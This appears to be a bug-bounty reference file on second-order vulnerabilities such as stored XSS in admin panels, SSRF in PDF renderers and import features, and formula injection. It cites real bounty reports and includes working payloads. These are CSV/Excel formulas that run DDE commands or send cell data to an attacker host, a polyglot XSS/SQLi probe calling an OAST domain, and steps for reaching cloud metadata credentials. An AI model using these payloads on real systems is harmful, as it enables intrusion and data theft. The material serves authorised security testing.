---
name: second-order
category: vulnerabilities
description: Stored payloads that fire in a second, less-protected context — XSS in PDF/email/admin, stored SSRF in avatars/webhooks, deferred SQLi in audit logs, cron-triggered command injection
depends_on: []
---

# Second-Order Vulnerabilities

A second-order bug is injection that lands clean in context A (where sanitization is tight) and detonates in context B (where it is not). The write and the read are separated by time, user role, subsystem, or render pipeline, so source-to-sink tracing across a single request misses them.

## Discovery Signals

| # | Signal | Where to Find | Why Vulnerable |
|---|--------|---------------|----------------|
| 1 | Blind XSS callback from internal domain | OAST/XSSHunter logs after spraying all text fields | Admin dashboards render customer data unsanitized -- $313K Google internal `*.googleplex.com` admin XSS (#984840704) |
| 2 | "View PDF" / "Export PDF" / "Print" button | Invoice, report, certificate, checklist generators | PDF renderers (wkhtmltopdf, Puppeteer) execute JS in server context -- $4K DoD FAST tool SSRF via PDF (#1628209) |
| 3 | CSV/Excel export of user-controlled data | Admin panels, analytics dashboards, data exports | Formula injection via `=cmd\|`, `=HYPERLINK()` fires in Excel on open |
| 4 | Webhook/avatar/RSS URL saved for later fetch | Integration settings, profile images, feed subscriptions | Background worker fetches without web-layer SSRF filters -- $10K GitLab SSRF via `remote_attachment_url` on import (#826361) |
| 5 | Import feature (project, data, schema, spec) | GitLab/GitHub import, OpenAPI import, backup restore | Mass-assignment bypasses model validation -- $33.5K GitLab RCE via GitHub import (#1679624) |
| 6 | Staff/team member name field | Account settings, team management | Name renders in activity logs, admin consoles -- $3K Shopify blind XSS via staff name (#948929) |
| 7 | Email template using `{{user.name}}` or concat | Password reset, invite, weekly digest, notification | SSTI in Jinja2/Handlebars/Velocity when raw data enters template context |
| 8 | Cross-app data flow (embedded app reads host fields) | Shopify apps, Slack apps, Atlassian Connect | App B trusts App A's data without sanitizing -- $500 Judge.me XSS via Shopify `product_type` (#1404770) |
| 9 | Activity log / audit trail displaying user fields | Admin > Activity, Compliance > Audit | Second-order render surface -- $2K Shopify stored XSS in activity log via member name (#391390) |
| 10 | Backup restore / database import flow | Admin > Backups, DB migration tools | Bypasses model-level validation entirely -- $512 Discourse RCE via username in backup (#214022) |
| 11 | `open-uri` / `Kernel.open` / `urllib.urlopen` in URI field | Ruby/Python apps with import features, schema validators | `file://` scheme gives LFI + SSRF in one call -- $16K GitLab arbitrary file read via import (#1132378) |
| 12 | Integration wizard (OpenAPI, SAML metadata, OAuth URL) | SaaS "Connect to X" setup flows | Fetch-URL features built fast, miss SSRF filters -- $50K Google AppSheet SSRF via OpenAPI spec (#192423424) |

## Second-Order Injection Matrix

| Input Point | Storage | Trigger | Vuln Class | Impact |
|-------------|---------|---------|------------|--------|
| Registration name/bio | User DB | Admin user list, internal CRM | Blind stored XSS | Admin session theft ($313K Google #984840704) |
| Staff member name | Team DB | Activity log viewed by owner | Stored XSS | Store admin ATO ($2K Shopify #391390) |
| Product type / vendor field | Product DB | Embedded app filter dropdown | Cross-app stored XSS | App-context takeover ($500 Judge.me #1404770) |
| Support ticket body | Ticket DB | Helpdesk UI, auto-translate | Blind stored XSS | Internal tool compromise ($3K Shopify #948929) |
| Form answer in admin tool | Session DB | PDF generator (View PDF) | SSRF via JS in renderer | Internal network pivot ($4K DoD #1628209) |
| GitHub API `default_branch` | Import JSON | Redis cache via `branch_exists?` | RESP injection -> RCE | Full server compromise ($33.5K GitLab #1679624) |
| Import JSON `remote_attachment_url` | Project export | CarrierWave `Kernel.open(url)` | SSRF | Cloud credential theft ($10K GitLab #826361) |
| Import JSON `issue_ids` | Project export | `assign_attributes` mass-assign | IDOR via FK reassignment | Cross-project data theft ($20K GitLab #743953) |
| Import JSON `note_html` | Project export | Cache-invalidation bypass | Stored XSS | Session theft on import ($4.5K GitLab #508184) |
| Username in backup SQL | Backup file | `gzip #{path}` backtick interpolation | Command injection | RCE ($512 Discourse #214022) |
| OpenAPI spec URL | Config field | Server-side URL fetch | SSRF | GCE metadata exfil ($50K Google #192423424) |
| Webhook/avatar URL | Profile DB | Background fetcher/resizer | Delayed SSRF | AWS cred theft, internal scan |

## Delayed Execution Patterns

| Pattern | Storage Duration | Trigger Event | Detection |
|---------|-----------------|---------------|-----------|
| Weekly email digest | 7 days | Cron fires digest build | OAST callback after 7+ days with field-tagged payload |
| PDF invoice generation | Hours to months | Admin clicks "Generate Invoice" | JS execution inside renderer hits OAST (wkhtmltopdf/Puppeteer) |
| Backup restore SQL replay | Days to years | Admin restores from backup | Injected field value bypasses model validation, hits shell/template |
| Import queue processing | Minutes to hours | Sidekiq/Celery picks job | Mass-assignment of gem-defined setters (`remote_*_url=`) |
| Audit log rendering | Permanent | Admin reviews user activity | Stored XSS fires when activity log page renders username |
| Nightly report builder | 24 hours | Cron runs report SQL | Second-order SQLi in report query using stored values |
| CI/CD pipeline | Minutes | Push triggers build | Branch name / commit message enters shell via `git log --format` |
| Search reindex (Elastic) | Hours | Indexer cron processes new docs | Scripted fields execute stored payload |

## CSV / Formula Injection

| Payload | Target App | Behavior | Impact |
|---------|-----------|----------|--------|
| `=cmd\|'/c calc'!A1` | Excel (Windows) | DDE executes command | Workstation RCE |
| `=HYPERLINK("http://oast.site/?"&A1,"Click")` | Excel/Sheets | Exfils cell data to attacker URL | Data theft from spreadsheet |
| `=IMPORTXML("http://oast.site/"&CONCAT(A1:Z1),"//x")` | Google Sheets | Server-side fetch of attacker URL with row data | Data exfiltration |
| `@SUM(1+1)*cmd\|'/c calc'!A1` | Excel | `@` prefix triggers formula evaluation | Bypasses `=` prefix filter |
| `+cmd\|'/c calc'!A1` | Excel | `+` prefix triggers formula evaluation | Bypasses `=` prefix filter |
| `-cmd\|'/c calc'!A1` | Excel | `-` prefix triggers formula evaluation | Bypasses `=` prefix filter |
| `\t=cmd\|'/c calc'!A1` | Excel | Tab prefix bypasses cell-start detection | Bypasses first-char filters |
| `"=cmd\|'/c calc'!A1` | Excel via CSV | Quote handling re-enables formula | Bypasses quote-wrapping defenses |

## Defense-Bypass Pairs

| Defense | Bypass | Real Pattern |
|---------|--------|-------------|
| Input sanitization on registration | Admin panel uses `\|safe` or different template engine | $313K Google -- customer-facing sanitized, admin dashboard not (#984840704) |
| `AttributeCleaner` blocklist on import | Gem-defined dynamic setter (`remote_*_url=`) not in blocklist | $10K GitLab -- CarrierWave's metaprogrammed setter slips through (#826361) |
| Rails model validates username format | Backup restore writes SQL directly, bypasses validates | $512 Discourse -- backtick interpolation of unsanitized username (#214022) |
| Cache-invalidation on markdown change | Set `cached_markdown_version` to magic value (917504) to defeat check | $4.5K GitLab -- imported `note_html` survives without regeneration (#508184) |
| CVE patch on `Cache::Import::Caching` | Find alternate call path (`branch_names_include?`) not through patched class | $33.5K GitLab -- patch-bypass via variant sink (#1679624) |
| JSON schema `format: uri` validation | `file://` scheme passes URI validation but reads local files | $16K GitLab -- `open-uri` handles both file:// and http:// (#1132378) |
| Public app sanitizes product fields | Embedded app (Judge.me) reads same field without sanitizing | $500 Judge.me -- cross-app trust boundary violation (#1404770) |
| Main login page has rate limiting | Fallback login page (post-failed-email-confirm) lacks rate limiting | $250 Acronis -- state-confusion triggers unprotected template (#1435392) |

## Chain Patterns

| Base Finding | Chain With | Combined Impact | Example |
|--------------|-----------|-----------------|---------|
| Blind stored XSS in customer field | Internal admin dashboard renders it | Admin ATO on internal corp domain | $313K Google admin dashboard XSS (#984840704) |
| Import mass-assignment (`issue_ids=`) | Sequential ID enumeration | Mass data theft across all projects | $20K GitLab project import IDOR (#743953) |
| Sawyer `to_s`/`bytesize` override | Redis RESP injection -> Marshal.load | RCE via deserialization chain | $33.5K GitLab GitHub import RCE (#1679624) |
| Path traversal via import `path` param | SSH `authorized_keys` `command=` directive | RCE on SSH connect | $2K GitLab import path traversal -> RCE (#298873) |
| SSRF via PDF renderer JS execution | Cloud metadata `169.254.169.254` | IAM credential theft | $4K DoD PDF generator SSRF (#1628209) |
| Import JSON `template: true` flag | Every new project gets attacker's service | Instance-wide data exfiltration | $11K GitLab injected templated service (#446585) |
| Low-priv member name XSS | Activity log viewed by store admin | Privilege escalation to admin | $2K Shopify activity log XSS (#391390) |
| `open-uri` accepts `file://` | Import URI field passes schema validation | Arbitrary local file read | $16K GitLab arbitrary file read (#1132378) |

## Attack Surface

**Write -> Read Pairs**
- Registration name/bio -> admin user list, CSV export, internal dashboards
- Profile email -> password-reset template, SMTP envelope, support ticket auto-fill
- Upload filename -> file listing, archive index, quarantine report
- Support ticket body -> helpdesk UI, auto-translate, analytics pipeline
- Device name -> push notification, SMS, audit log
- Webhook/avatar URL -> background fetcher, image proxy, RSS sync
- Comment -> moderation queue, sentiment-analysis microservice, weekly email digest
- Shared document -> PDF export, print preview, email-to-friend

**Renderers That Bite**
- Headless Chrome / Puppeteer (PDF, screenshot) -- JS runs with `file://` often enabled
- `wkhtmltopdf`, `weasyprint`, `pdfkit` -- legacy, no sandbox
- Email templating: Jinja2, Handlebars, Twig, Velocity -- SSTI-prone
- CSV/Excel export: formula injection via `=`, `+`, `-`, `@`, `\t`
- Markdown -> HTML pipelines (marked, showdown) bypassing DOM sanitizer
- SVG renderers retaining `<script>` from image uploads

**Asynchronous Sinks**
- Cron jobs, Celery/Sidekiq workers, batch imports, nightly reports
- Replication to data-warehouse, Kafka -> downstream consumer
- Search indexer (Elastic/OpenSearch) with scripted fields
- CI/CD reading repo metadata (branch name, commit message) into shell

## Testing Methodology

1. **Inventory storage** -- every writeable field: profile, settings, device names, comments, uploads, tags, webhooks, URLs, import manifests
2. **Inventory rendering contexts** -- where does the stored value appear? HTML page, email, PDF, CSV, mobile app, push notification, admin panel, log viewer, embedded app
3. **Unique payloads** -- each field gets a unique OAST subdomain: `"><img src=https://{fieldname}.{uid}.oast.site>{{7*7}}'||(select pg_sleep(0))||'`
4. **Trigger every async path** -- password reset, export, weekly digest, admin view, share with teammate, print, download as PDF, import, backup restore
5. **Role pivot** -- inject as low-priv user, observe rendering as admin/owner
6. **Patience** -- wait 24-48h; cron schedules betray themselves
7. **Diff renderers** -- same payload, different sinks: web sanitized, PDF not; mobile sanitized, email not

## Blind Second-Order Detection

```
# Seed every free-text field with uniquely tagged payloads:
"><img src=https://{field}.{uid}.oast.site/xss>{{7*7}}'||(select pg_sleep(0))||'

# Revisit OAST logs at:
# Immediately, +5min, +1h, +24h, +7 days
# After triggering admin action (support ticket, audit log review)
```

## Pro Tips

1. Poison every field with a unique OAST tag on day 1 and revisit logs over a week -- cron jobs surface slow
2. "What does the admin see" is almost always a different renderer than "what I see" -- pair up with a second account if scope permits
3. Look for microservice boundaries: anywhere data crosses a queue, a language, or a framework, sanitization rarely crosses with it
4. PDF pipelines are overlooked; headless Chrome runs your JS with `file://` enabled more often than you'd expect
5. Import features are universal high-impact surfaces: mass-assignment, path traversal, SSRF via URI fields -- audit every attribute the import deserializes
6. Gem-defined dynamic setters (CarrierWave `remote_*_url=`, Paperclip) are invisible in model source but live on the instance -- enumerate the actual method set, not just the code
7. Patch-bypass hunting: when a CVE is fixed, read the diff and search for variant call paths the patch missed -- highest-EV strategy for import/deser bugs
8. Cross-app data flows (embedded apps reading host platform fields) are an entire class: the embedded app trusts data it didn't sanitize
9. For CSV formula injection, test `@`, `+`, `-`, `\t` prefixes alongside `=` -- many filters only block `=`
10. When `open-uri` or `urllib` handles URLs, always test `file://` -- many implementations collapse LFI and SSRF into one call
11. Cache-invalidation logic can be defeated by setting internal fields (like `cached_markdown_version`) via import -- trace every field the predicate reads
12. Activity logs and audit trails are the single most under-tested second-order XSS surface -- they batch actions from multiple users, are viewed by admins, and are rarely in scope for QA
